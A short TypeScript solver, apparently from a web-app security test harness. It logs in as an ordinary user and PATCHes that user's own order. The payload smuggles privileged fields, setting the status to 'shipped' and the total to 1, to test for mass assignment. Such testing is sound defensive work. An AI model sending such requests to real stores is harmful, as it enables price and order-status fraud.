// Patch an own order through the update endpoint while smuggling privileged fields in the payload.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

interface OrderRef { external_id: string }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const list = await ctx.fetch(buildPath(ctx.plan, 'listOrders'), { method: 'GET' })
  const data = (await list.json().catch(() => ({}))) as { orders?: OrderRef[] }
  const target = data.orders?.[0]
  if (!target) return
  await ctx.fetch(buildPath(ctx.plan, 'updateOrder', { orderId: target.external_id }), {
    method: 'PATCH',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ note: 'priority customer', status: 'shipped', total: 1 }),
  })
}
